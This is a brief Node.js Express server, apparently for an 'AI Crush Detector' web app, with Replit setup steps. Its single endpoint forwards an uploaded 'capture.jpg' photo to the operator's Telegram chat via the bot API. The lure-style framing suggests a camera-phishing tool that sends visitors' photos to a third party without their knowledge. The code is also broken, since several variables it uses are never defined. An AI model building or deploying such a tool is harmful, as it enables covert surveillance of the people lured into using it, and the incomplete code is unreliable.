/*
 * AI Crush Detector - Fixed Telegram Photo Upload
 * 
 * REPLIT DEPLOYMENT INSTRUCTIONS:
 * 1. After uploading these files, run: npm install
 * 2. Set environment variables in Replit secrets:
 *    - TELEGRAM_BOT_TOKEN (get from @BotFather)
 *    - TELEGRAM_CHAT_ID (get from @userinfobot)
 * 3. Click "Run" or use: npm start
 * 4. Test the application - photos should now reach Telegram reliably
 */

const express = require("express");
const multer = require("multer");
const path = require("path");
const FormData = require("form-data");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

// Fixed photo upload endpoint using form-data + axios
app.post("/api/send-photo", upload.single("photo"), async (req, res) => {
    // Proper multipart/form-data handling with filename and contentType
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("photo", req.file.buffer, {
        filename: "capture.jpg",
        contentType: "image/jpeg"
    });
    
    // Uses axios with proper headers and error handling
    const response = await axios.post(
        `https://api.telegram.org/bot${botToken}/sendPhoto`,
        formData,
        {
            headers: {
                ...formData.getHeaders(),
                'Content-Length': formData.getLengthSync()
            },
            timeout: 30000
        }
    );
    
    res.json({ success: true });
});

// Server binds to 0.0.0.0 for Replit compatibility
app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
